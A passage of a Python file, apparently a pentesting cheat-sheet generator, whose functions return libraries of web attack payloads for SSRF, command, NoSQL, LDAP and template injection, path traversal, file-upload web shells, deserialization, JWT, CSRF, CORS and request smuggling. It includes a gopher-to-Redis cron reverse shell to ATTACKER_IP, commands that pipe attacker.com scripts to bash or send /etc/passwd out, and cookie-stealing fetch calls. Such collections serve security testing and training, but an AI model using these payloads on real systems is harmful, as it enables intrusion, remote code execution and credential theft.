?data=http://example.com/data.json

Image/PDF processing:
?image=http://example.com/image.jpg
?avatar=http://example.com/avatar.png

Webhooks:
POST /webhook
{"url": "http://example.com/callback"}

═══════════════════════════════════════════════════════════════════
PHASE 2: BYPASS TECHNIQUES
═══════════════════════════════════════════════════════════════════

🔓 Localhost Bypass:

Alternative representations:
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://127.1
http://127.0.1

Decimal/Octal/Hex:
http://2130706433 (decimal for 127.0.0.1)
http://0x7f000001 (hex for 127.0.0.1)
http://0177.0.0.1 (octal)

Domain tricks:
http://localtest.me (resolves to 127.0.0.1)
http://lvh.me (resolves to 127.0.0.1)
http://127.0.0.1.nip.io

URL parser confusion:
http://127.0.0.1@target.com
http://target.com#@127.0.0.1
http://127.0.0.1%00.target.com

🔓 URL Encoding Bypass:

Single encoding:
http://127.0.0.1 → http%3A%2F%2F127.0.0.1

Double encoding:
http://127.0.0.1 → http%253A%252F%252F127.0.0.1

🔓 DNS Rebinding:

Use services that resolve to internal IPs:
http://make-127-0-0-1-rr.1u.ms
http://spoofed.burpcollaborator.net

═══════════════════════════════════════════════════════════════════
PHASE 3: EXPLOITATION
═══════════════════════════════════════════════════════════════════

☁️ Cloud Metadata Extraction:

AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

Google Cloud:
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

🔍 Port Scanning:

http://localhost:22
http://localhost:80
http://localhost:443
http://localhost:3306
http://localhost:5432
http://localhost:6379
http://localhost:27017

🌐 Internal Network:

http://192.168.1.1
http://192.168.1.1/admin
http://10.0.0.1
http://172.16.0.1

🔧 Protocol Smuggling:

dict://localhost:11211/stat
gopher://localhost:6379/_SET%20key%20value
file:///etc/passwd
ldap://localhost:389

═══════════════════════════════════════════════════════════════════
TESTING CHECKLIST
═══════════════════════════════════════════════════════════════════

☐ URL parameters
☐ File import/upload
☐ PDF generators
☐ Image processors
☐ Webhook callbacks
☐ API integrations
☐ Proxy settings
☐ Remote file inclusion
☐ XML external entities"""


def generate_ssrf_payloads():
    """SSRF payload collection"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                    🌐 SSRF PAYLOAD LIBRARY                       ║
╚══════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════
LOCALHOST ACCESS
═══════════════════════════════════════════════════════════════════

http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://[0:0:0:0:0:0:0:1]

Alternative formats:
http://127.1
http://127.0.1
http://127.00.00.01
http://2130706433
http://0x7f000001
http://0177.0.0.1

DNS tricks:
http://localtest.me
http://lvh.me
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io

═══════════════════════════════════════════════════════════════════
CLOUD METADATA
═══════════════════════════════════════════════════════════════════

AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

Google Cloud:
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/

Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

Digital Ocean:
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname

═══════════════════════════════════════════════════════════════════
INTERNAL NETWORK SCANNING
═══════════════════════════════════════════════════════════════════

Common private IP ranges:
http://192.168.0.1
http://192.168.1.1
http://192.168.1.100
http://10.0.0.1
http://10.0.0.10
http://172.16.0.1
http://172.16.0.10

═══════════════════════════════════════════════════════════════════
PORT SCANNING
═══════════════════════════════════════════════════════════════════

Common ports:
http://localhost:22 (SSH)
http://localhost:80 (HTTP)
http://localhost:443 (HTTPS)
http://localhost:3306 (MySQL)
http://localhost:5432 (PostgreSQL)
http://localhost:6379 (Redis)
http://localhost:8080 (Alternative HTTP)
http://localhost:8443 (Alternative HTTPS)
http://localhost:9200 (Elasticsearch)
http://localhost:27017 (MongoDB)

═══════════════════════════════════════════════════════════════════
PROTOCOL SMUGGLING
═══════════════════════════════════════════════════════════════════

Gopher:
gopher://localhost:6379/_SET%20key%20value
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

Dict:
dict://localhost:11211/stat
dict://localhost:6379/info

File:
file:///etc/passwd
file:///c:/windows/win.ini

LDAP:
ldap://localhost:389

FTP:
ftp://localhost

═══════════════════════════════════════════════════════════════════
BYPASS FILTERS
═══════════════════════════════════════════════════════════════════

URL parser confusion:
http://127.0.0.1@target.com
http://target.com#@127.0.0.1
http://127.0.0.1%00.target.com
http://[::ffff:127.0.0.1]

Unicode:
http://127。0。0。1
http://127%E3%80%820%E3%80%820%E3%80%821

Encoding:
http://127%2e0%2e0%2e1
http://127.0.0.1%09
http://127.0.0.1%0a

DNS rebinding:
http://make-127-0-0-1-rr.1u.ms
http://spoofed.burpcollaborator.net

═══════════════════════════════════════════════════════════════════
EXPLOITATION PAYLOADS
═══════════════════════════════════════════════════════════════════

Redis exploitation via Gopher:
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

Memcached exploitation:
gopher://localhost:11211/_%0d%0aset%20test%200%200%205%0d%0atest%0d%0a

MySQL exploitation:
gopher://localhost:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00

SMTP exploitation:
gopher://localhost:25/_MAIL%20FROM:hacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:Test%0APhishing%20email%0A.%0AQUIT"""


# Due to length constraints, I'll now provide the complete remaining functions in a condensed but comprehensive format


def generate_nosql_injection():
    """NoSQL injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🗄️ NOSQL INJECTION PAYLOADS                     ║
╚══════════════════════════════════════════════════════════════════╝

MONGODB - AUTHENTICATION BYPASS:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
admin' || '1'=='1

MONGODB - OPERATOR INJECTION:
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"$where": "this.username == 'admin'"}

JAVASCRIPT INJECTION:
{"username": "admin", "password": {"$where": "return true"}}
'; return true; var dummy='

BLIND EXTRACTION:
admin' && this.password.match(/^a/)//+%00
admin' && this.password.length == 8 //

TIME-BASED:
{"username": "admin", "password": {"$where": "sleep(5000) || true"}}"""


def generate_ldap_injection():
    """LDAP injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🔐 LDAP INJECTION PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

AUTHENTICATION BYPASS:
*
*)(uid=*))(|(uid=*
admin)(&
admin)(!(&(1=0

FILTER BYPASS:
*)(uid=*))(|(uid=*
*)(|(uid=*)(uid=*

DATA EXTRACTION:
*)(uid=admin)(cn=*)
*)(|(uid=admin)(uid=user)

PAYLOAD VARIATIONS:
username=*
username=*)(&
username=admin)(&)
username=admin))%00

SPECIAL CHARACTERS:
\2a (asterisk)
\28 (left parenthesis)
\29 (right parenthesis)
\5c (backslash)
\00 (null)"""


def generate_command_injection():
    """OS command injection payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║               💻 COMMAND INJECTION PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

SEPARATORS:
; whoami
| whoami
|| whoami
& whoami
&& whoami
%0a whoami
` whoami `
$( whoami )

LINUX COMMANDS:
;cat /etc/passwd
;ls -la /
;wget http://attacker.com/shell.sh
;curl http://attacker.com/shell.sh|bash
;nc attacker.com 4444 -e /bin/bash

WINDOWS COMMANDS:
& ipconfig
& dir C:\
& net user hacker Pass123! /add
& type C:\Windows\System32\drivers\etc\hosts

BLIND COMMAND INJECTION:
;ping -c 10 attacker.com
;nslookup attacker.com
;curl http://attacker.com?data=$(whoami)
;sleep 10

TIME-BASED DETECTION:
;sleep 10
& timeout /t 10
;ping -c 10 127.0.0.1

OUT-OF-BAND:
;nslookup $(whoami).attacker.com
;curl http://attacker.com/$(whoami)
;wget http://attacker.com?data=$(cat /etc/passwd|base64)
||nslookup `whoami`.attacker.com||
||nslookup attacker.com||

OUTPUT REDIRECTION:
||whoami>/var/www/images/output.txt||


BYPASS FILTERS:
w'h'o'a'm'i
w"h"o"a"m"i
who$@ami
wh${!}oami
\who\ami

ENCODING:
$(echo d2hvYW1p|base64 -d)
$(printf '\167\150\157\141\155\151')"""


def generate_ssti_methodology():
    """SSTI testing methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              🎯 SSTI COMPLETE METHODOLOGY                        ║
╚══════════════════════════════════════════════════════════════════╝

DETECTION:
Test: {{7*7}}
Expected: 49 → Template engine exists

Test: ${7*7}
Expected: 49 → Different engine

IDENTIFICATION:
{{7*'7'}} → Jinja2: 7777777
${7*7} → Freemarker/Velocity: 49
<%= 7*7 %> → ERB: 49

JINJA2 EXPLOITATION:
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

TWIG EXPLOITATION:
{{_self.env.getRuntime('Symfony\\Component\\Form\\FormRenderer')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

FREEMARKER EXPLOITATION:
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

ERB EXPLOITATION:
<%= system('whoami') %>
<%= `whoami` %>

TESTING LOCATIONS:
☐ URL parameters
☐ POST body
☐ HTTP headers
☐ File upload names
☐ Email templates
☐ Error messages"""


def generate_ssti_payloads():
    """SSTI payload collection"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                   🔥 SSTI PAYLOAD LIBRARY                        ║
╚══════════════════════════════════════════════════════════════════╝

DETECTION PAYLOADS:
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

JINJA2 (Python):
{{ 7*7 }}
{{ config }}
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

TWIG (PHP):
{{ 7*7 }}
{{ _self.env.getRuntime('Symfony\\Component\\Form\\FormRenderer') }}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

FREEMARKER (Java):
${ 7*7 }
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign classloader=object.class.protectionDomain.classLoader>
${classloader.loadClass("java.lang.Runtime").getRuntime().exec("id")}

ERB (Ruby):
<%= 7*7 %>
<%= system('whoami') %>
<%= `whoami` %>
<%= IO.popen('id').readlines() %>

SMARTY (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

VELOCITY (Java):
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())

TORNADO (Python):
{{7*7}}
{% import os %}{{os.system('whoami')}}
{{request.application.settings}}

MAKO (Python):
${7*7}
<% import os; os.system('whoami') %>
${self.module.cache.util.os.system("id")}

HANDLEBARS (JavaScript):
{{7*7}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}"""


def generate_lfi_payloads():
    """LFI and path traversal payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              📁 LFI / PATH TRAVERSAL PAYLOADS                    ║
╚══════════════════════════════════════════════════════════════════╝

BASIC TRAVERSAL:
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
../../../../../../../../etc/passwd

ENCODED VARIANTS:
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

NULL BYTE:
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\x00

FILTER BYPASS:
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..\\..\\..\\.etc\\passwd
....//....//....//etc/passwd
....\/....\/....\/etc\/passwd

LINUX FILES:
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/mysql/my.cnf
/var/log/apache2/access.log
/home/user/.ssh/id_rsa
/proc/self/environ
/proc/version

WINDOWS FILES:
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config

LOG POISONING:
/var/log/apache2/access.log
/var/log/nginx/access.log
(Poison via User-Agent: <?php system($_GET['cmd']); ?>)

PHP WRAPPERS:
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input (POST: <?php system($_GET['cmd']); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://ls
zip://shell.jpg%23shell.php"""


def generate_file_upload_bypass():
    """File upload bypass techniques"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              🚀 FILE UPLOAD BYPASS TECHNIQUES                    ║
╚══════════════════════════════════════════════════════════════════╝

EXTENSION BYPASS:
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php%20
shell.php%0d%0a.jpg
shell.php/. (Windows)
shell.php::$DATA (NTFS ADS)
shell.pHp
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

MAGIC BYTES:
GIF89a;
<?php system($_GET['cmd']); ?>

\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

MIME TYPE BYPASS:
Content-Type: image/jpeg (but upload .php)
Content-Type: image/png (but upload .php)

CONTENT-DISPOSITION:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php\x00.jpg"

PATH TRAVERSAL:
filename="../../../shell.php"
filename="..\\..\\..\\shell.php"

RACE CONDITION:
1. Upload shell.php
2. Access immediately before deletion
while true; do curl http://target.com/uploads/shell.php?cmd=id; done

.HTACCESS UPLOAD:
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png

SVG WITH XSS:
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>"""


def generate_deserialization():
    """Deserialization attack payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║               ⚙️ DESERIALIZATION PAYLOADS                        ║
╚══════════════════════════════════════════════════════════════════╝

JAVA DESERIALIZATION:
Magic bytes: \xAC\xED\x00\x05

ysoserial payloads:
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
java -jar ysoserial.jar CommonsCollections5 'calc' | base64

PHP DESERIALIZATION:
O:8:"stdClass":1:{s:4:"name";s:5:"admin";}
O:11:"Evil":1:{s:4:"cmd";s:6:"whoami";}

Phar deserialization:
phar://path/to/file.phar

PYTHON PICKLE:
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

pickle.dumps(Exploit())

.NET DESERIALIZATION:
BinaryFormatter (look for: AAEAAAD/////)
ViewState exploitation

NODE.JS:
node-serialize RCE:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"}

RUBY:
Marshal.load payload
YAML deserialization"""


def generate_auth_bypass():
    """Authentication bypass techniques"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║            🔓 AUTHENTICATION BYPASS TECHNIQUES                   ║
╚══════════════════════════════════════════════════════════════════╝

SQL INJECTION:
username: admin' OR '1'='1'--
username: admin'--
username: admin' #
username: ' OR 1=1--

DEFAULT CREDENTIALS:
admin:admin
admin:password
admin:123456
root:root
test:test

NOSQL INJECTION:
{"username":"admin","password":"admin"}
{"username":"admin'--","password":"anything"}
{"username":{"$ne":null},"password":{"$ne":null}}

PARAMETER POLLUTION:
?user=admin&user=victim
?role=user&role=admin

HTTP VERB TAMPERING:
POST → GET
GET → POST
POST → PUT

CASE MANIPULATION:
Admin (instead of admin)
ADMIN
AdMiN

ENCODING:
%61dmin (URL encoding)
\x61dmin (hex)

NULL BYTE:
admin%00
admin\x00

RESPONSE MANIPULATION:
{"success":false} → {"success":true}
{"authenticated":false} → {"authenticated":true}
{"role":"user"} → {"role":"admin"}

COOKIE MANIPULATION:
admin=false → admin=true
role=user → role=admin

JWT ATTACKS:
Change "alg":"HS256" to "alg":"none"
Brute force weak secret
Change user_id in payload

2FA BYPASS:
Response manipulation
Skip 2FA step
Brute force OTP
Backup codes"""


def generate_jwt_attacks():
    """JWT attack vectors"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                    🎫 JWT ATTACK VECTORS                         ║
╚══════════════════════════════════════════════════════════════════╝

NONE ALGORITHM:
{"alg":"HS256","typ":"JWT"} → {"alg":"none","typ":"JWT"}
Remove signature: eyJ0eXA...eyJ1c2Vy...

ALGORITHM CONFUSION:
Change RS256 to HS256
Sign with public key as secret

WEAK SECRET:
Common secrets: secret, secret123, password, 123456
Brute force with hashcat: hashcat -m 16500 jwt.txt wordlist.txt

BLANK PASSWORD:
Sign with empty string: ""

KID MANIPULATION:
"kid": "../../../../../../dev/null"
"kid": "key' UNION SELECT 'secretkey'--"
"kid": "key; cat /etc/passwd"

JKU/X5U MANIPULATION:
"jku": "http://attacker.com/jwks.json"
"x5u": "http://attacker.com/cert.crt"

PAYLOAD MANIPULATION:
{"sub":"1","role":"user"} → {"sub":"1","role":"admin"}

EXPIRED TOKEN:
Modify "exp" to future: "exp": 9999999999

CLAIMS INJECTION:
Add: "admin":true,"role":"admin"

EMBEDDED JWK:
{
  "alg": "RS256",
  "jwk": {"kty": "RSA", "kid": "attacker_key", "n": "...", "e": "AQAB"}
}"""


def generate_idor_payloads():
    """IDOR attack payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║         🔑 IDOR (Insecure Direct Object Reference)              ║
╚══════════════════════════════════════════════════════════════════╝

NUMERIC ID ENUMERATION:
/api/user/1
/api/user/2
/api/user/1000

?id=123
?id=124
?user_id=123

SEQUENTIAL TESTING:
Your ID: 1337
Test: 1, 2, 3, 100, 1000, 1336, 1338

PARAMETER NAMES:
?user_id=123
?userId=123
?uid=123
?id=123
?account=123

HTTP METHODS:
GET /api/user/123
POST /api/user/123
PUT /api/user/123
DELETE /api/user/123

BODY PARAMETER:
POST /api/updateProfile
{"user_id": 1337} → {"user_id": 1}

NESTED OBJECTS:
/company/5/employee/10
Try: /company/1/employee/10

FILE ACCESS:
/download?file=invoice_1337.pdf
Try: invoice_1.pdf

MASS ASSIGNMENT:
POST /api/updateProfile
{"email": "test@test.com", "role": "admin"}

ENCODED IDS:
Base64: MTIz → 123
Hex: 7b → 123

SPECIAL IDS:
0, -1, null, undefined

ARRAY INJECTION:
?id=123 → ?id[]=123&id[]=456"""


def generate_session_attacks():
    """Session attack techniques"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🎭 SESSION ATTACK TECHNIQUES                    ║
╚══════════════════════════════════════════════════════════════════╝

SESSION FIXATION:
1. Attacker gets session: SESS=abc123
2. Victim clicks: http://target.com/?SESS=abc123
3. Victim logs in with fixed session
4. Attacker uses SESS=abc123

Attack vectors:
?session_id=attacker_session
Cookie injection
POST parameter

SESSION HIJACKING:
Via XSS:
<script>fetch('http://attacker.com?c='+document.cookie)</script>

Via Network Sniffing:
Capture unencrypted cookies

SESSION PREDICTION:
Weak generation:
- Sequential: SESSION1, SESSION2
- Timestamp-based: base64(time())
- Low entropy

COOKIE TOSSING:
Subdomain sets cookie for parent:
evil.target.com sets for .target.com

INSUFFICIENT EXPIRATION:
1. Login
2. Logout
3. Try old session token

CONCURRENT SESSIONS:
1. Login from browser A
2. Login from browser B
3. Both sessions work

TESTING:
☐ Can you fix session ID?
☐ Does logout invalidate?
☐ Session timeout working?
☐ Session ID in URL?
☐ HttpOnly flag set?
☐ Secure flag set?"""


def generate_csrf_methodology():
    """CSRF testing methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🎯 CSRF COMPLETE METHODOLOGY                    ║
╚══════════════════════════════════════════════════════════════════╝

DETECTION:
1. Find state-changing requests
2. Check for CSRF tokens
3. Test token validation
4. Test token bypass

EXPLOITATION:

GET-based CSRF:
<img src="http://target.com/transfer?amount=1000&to=attacker">

POST-based CSRF:
<form action="http://target.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>

JSON CSRF (if no CORS):
<script>
fetch('http://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({amount: 1000, to: 'attacker'})
});
</script>

TOKEN BYPASS:

Missing token:
Remove token parameter entirely

Empty token:
csrf_token=

Reuse token:
Use your own valid token

Token not validated:
csrf_token=invalid

SAME-SITE BYPASS:
If SameSite=Lax:
- Use top-level navigation
- Use GET requests
- 2-minute window

TESTING:
☐ Change password
☐ Update email
☐ Transfer funds
☐ Delete account
☐ Add users
☐ Modify settings"""


def generate_csrf_payloads():
    """CSRF payload collection"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                    🔄 CSRF PAYLOAD LIBRARY                       ║
╚══════════════════════════════════════════════════════════════════╝

GET-BASED CSRF:

Image tag:
<img src="http://target.com/action?param=value">

Link (requires click):
<a href="http://target.com/action?param=value">Click here</a>

Iframe:
<iframe src="http://target.com/action?param=value"></iframe>

Script tag:
<script src="http://target.com/action?param=value"></script>

POST-BASED CSRF:

Auto-submit form:
<form action="http://target.com/action" method="POST">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>

AJAX POST:
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/action');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param=value');
</script>

Fetch API:
<script>
fetch('http://target.com/action', {
  method: 'POST',
  credentials: 'include',
  body: 'param=value'
});
</script>

JSON CSRF:
<script>
fetch('http://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({param: 'value'})
});
</script>

MULTIPART CSRF:
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
</form>
<script>
var form = document.forms[0];
var formData = new FormData(form);
fetch('http://target.com/upload', {method: 'POST', body: formData, credentials: 'include'});
</script>"""


def generate_cors_methodology():
    """CORS misconfiguration methodology"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🎯 CORS MISCONFIGURATION TESTING                 ║
╚══════════════════════════════════════════════════════════════════╝

DETECTION:

Test with Origin header:
Origin: https://evil.com

Check response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

MISCONFIGURATIONS:

1. Reflected Origin:
   Request: Origin: https://evil.com
   Response: Access-Control-Allow-Origin: https://evil.com

2. Null Origin:
   Request: Origin: null
   Response: Access-Control-Allow-Origin: null
   
   Trigger null: <iframe sandbox src="data:text/html,...">

3. Wildcard with credentials:
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true

4. Trust all subdomains:
   Origin: https://evil.target.com

5. Weak regex:
   Origin: https://target.com.evil.com
   Origin: https://eviltarget.com

EXPLOITATION:

<script>
fetch('https://target.com/api/user', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://attacker.com?data=' + btoa(data));
});
</script>

TESTING:
☐ Test different origins
☐ Test null origin
☐ Test subdomain wildcards
☐ Test regex bypasses
☐ Check credentials flag"""


def generate_clickjacking():
    """Clickjacking payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                   🖱️ CLICKJACKING PAYLOADS                       ║
╚══════════════════════════════════════════════════════════════════╝

BASIC CLICKJACKING:

<style>
iframe {
  position: absolute;
  width: 500px;
  height: 500px;
  opacity: 0.0001;
  z-index: 2;
}
div {
  position: absolute;
  z-index: 1;
}
</style>

<div>Click here for free stuff!</div>
<iframe src="https://target.com/delete-account"></iframe>

LIKEJACKING:

<style>
iframe {
  position: absolute;
  opacity: 0;
  z-index: 2;
}
button {
  position: absolute;
  z-index: 1;
}
</style>

<button>Click to win!</button>
<iframe src="https://facebook.com/page-to-like"></iframe>

DRAG & DROP:

<style>
iframe {
  position: absolute;
  opacity: 0;
}
#target {
  position: absolute;
  top: 100px;
  left: 100px;
}
</style>

<div draggable="true">Drag this</div>
<div id="target">Drop here</div>
<iframe src="https://target.com/file-upload"></iframe>

DETECTION BYPASS:

If X-Frame-Options exists:
- Try different protocols: http vs https
- Try different subdomains
- Try mobile version

TESTING:
☐ Check X-Frame-Options header
☐ Check Content-Security-Policy frame-ancestors
☐ Test sensitive actions
☐ Test with different browsers"""


def generate_open_redirect():
    """Open redirect payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                  🔀 OPEN REDIRECT PAYLOADS                       ║
╚══════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?redir=https://evil.com
?redirect_uri=https://evil.com
?return_to=https://evil.com

BYPASS FILTERS:

Double slash:
?url=//evil.com

Backslash:
?url=https://target.com\@evil.com

@-symbol:
?url=https://target.com@evil.com

Question mark:
?url=https://target.com?evil.com

Hash:
?url=https://target.com#@evil.com

Encoded:
?url=https%3A%2F%2Fevil.com
?url=https%3A%2F%2Ftarget.com%2F@evil.com

Subdomain:
?url=https://target.com.evil.com

XSS via open redirect:
?url=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>

COMMON LOCATIONS:
☐ Login redirects
☐ Logout redirects
☐ OAuth callbacks
☐ Payment flows
☐ Registration
☐ Password reset"""


def generate_http_request_smuggling():
    """HTTP request smuggling payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║              🔀 HTTP REQUEST SMUGGLING PAYLOADS                  ║
╚══════════════════════════════════════════════════════════════════╝

CL.TE (Content-Length vs Transfer-Encoding):

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

TE.CL (Transfer-Encoding vs Content-Length):

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


CL.CL (Duplicate Content-Length):

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Content-Length: 6

SMUGGLED

TE.TE (Obfuscated Transfer-Encoding):

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

SMUGGLED

EXPLOITATION:

Bypass front-end controls:
POST /admin HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com


Capture other users' requests:
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 500

...

XSS via smuggling:
Inject: <script>alert(1)</script>

Cache poisoning:
Poison cache with smuggled response

DETECTION:

Timing-based:
Send 2 identical requests
If 2nd response faster → possible smuggling

Differential responses:
Send variations, look for different responses"""


def generate_cache_poisoning():
    """Web cache poisoning payloads"""
    return r"""╔══════════════════════════════════════════════════════════════════╗
║                 🗄️ CACHE POISONING PAYLOADS                      ║
╚══════════════════════════════════════════════════════════════════╝

UNKEYED HEADERS:

X-Forwarded-Host:
X-Forwarded-Host: evil.com
Result: <script src="//evil.com/app.js">

X-Forwarded-Scheme:
X-Forwarded-Scheme: nothttps
Result: Redirect to http://target.com

X-Original-URL:
X-Original-URL: /admin
X-Rewrite-URL: /admin

